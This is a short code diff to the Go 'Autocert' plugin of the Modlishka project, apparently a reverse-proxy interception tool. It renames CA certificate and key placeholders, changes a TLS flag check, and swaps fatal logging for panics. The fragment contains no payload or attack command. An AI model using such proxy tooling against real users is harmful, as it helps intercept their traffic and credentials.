@@ -24,15 +24,14 @@ import (
 	"encoding/binary"
 	"encoding/pem"
 	"math/big"
-	"os"
 	"time"
 
 	"github.com/drk1wi/Modlishka/config"
 	"github.com/drk1wi/Modlishka/log"
 )
 
-const CA_CERT = `PASTE_YOUR_CA_CERT_HERE`
-const CA_CERT_KEY = `PASTE_YOUR_CA_CERT_KEY_HERE`
+const CA_CERT = `PASTE_CA_CERT_HERE`
+const CA_CERT_KEY = `PASTE_CA_PRIV_KEY_HERE`
 
 func init() {
 
@@ -44,21 +43,21 @@ func init() {
 
 	s.Flags = func() {
 
-		if *config.C.UseTls == true {
+		if *config.C.ForceHTTP == false {
 			if len(*config.C.TLSCertificate) == 0 && len(*config.C.TLSKey) == 0 {
+
+				log.Infof("Autocert plugin: Auto-generating TLS certificate")
 
 				CAcert := CA_CERT
 				CAkey := CA_CERT_KEY
 
 				catls, err := tls.X509KeyPair([]byte(CAcert), []byte(CAkey))
 				if err != nil {
-					log.Fatalf("Autocert plugin: %s", err.Error())
-					os.Exit(-1)
+					panic(err)
 				}
 				ca, err := x509.ParseCertificate(catls.Certificate[0])
 				if err != nil {
-					log.Fatalf("Autocert plugin: %s", err.Error())
-					os.Exit(-1)
+					panic(err)
 				}
 
 				var n int32
